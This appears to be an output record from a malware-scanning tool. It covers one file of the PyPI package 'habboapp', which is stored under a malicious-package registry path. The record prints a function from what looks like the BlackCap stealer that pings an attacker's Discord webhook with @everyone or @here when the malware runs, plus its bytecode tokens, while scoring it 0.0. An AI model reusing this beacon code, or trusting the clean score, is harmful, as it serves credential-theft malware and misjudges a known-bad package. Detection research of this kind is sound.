statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/habboapp/0.1.0/habboapp-0.1.0-py3-none-any/habboapp/__init__.py
  contents:
  - name: bc_initial_func.ping_on_running
    score: 0.0
    code: |-
      def ping_on_running(self: str) -> str:
              ping1 = {
                  'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
                  'content': "@everyone"
                  }
              ping2 = {
                  'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
                  'content': "@here"
                  }
              if self.pingonrun == "yes":
                  if self.regex_webhook_dsc in self.discord_webhook:
                      if self.pingtype == "@everyone" or self.pingtype == "everyone":
                          httpx.post(self.discord_webhook, json=ping1)
                  if self.pingtype == "@here" or self.pingtype == "here":
                      if self.regex_webhook_dsc in self.discord_webhook :
                          httpx.post(self.discord_webhook, json=ping2)
    tokens: TARGETED_FILE resume load_const STRING_URL load_const @everyone load_const build_const_key_map store_fast ping1 load_const STRING_URL load_const @here load_const build_const_key_map store_fast ping2 load_fast self load_attr pingonrun load_const yes compare_op == pop_jump_if_false TO_NUMBER load_fast self load_attr STRING_LEN_S_ENT_HIGH load_fast self load_attr discord_webhook contains_op pop_jump_if_false TO_NUMBER load_fast self load_attr pingtype load_const @everyone compare_op == pop_jump_if_true TO_NUMBER load_fast self load_attr pingtype load_const everyone compare_op == pop_jump_if_false TO_NUMBER load_global httpx load_attr post load_fast self load_attr discord_webhook load_fast ping1 kw_names json call pop_top load_fast self load_attr pingtype load_const @here compare_op == pop_jump_if_true TO_NUMBER load_fast self load_attr pingtype load_const here compare_op == pop_jump_if_false TO_NUMBER load_fast self load_attr STRING_LEN_S_ENT_HIGH load_fast self load_attr discord_webhook contains_op pop_jump_if_false TO_NUMBER load_global httpx load_attr post load_fast self load_attr discord_webhook load_fast ping2 kw_names json call pop_top return_const None return_const None return_const None return_const None
    hash: 20d0e36d421cbe0b903022cd4ccbb1055ae5c46e8a936eeb1cb834c58c5f9065
sources:
  .repo_cache/malicious_repos/pypi_malregistry/habboapp/0.1.0/habboapp-0.1.0-py3-none-any/habboapp/__init__.py: 
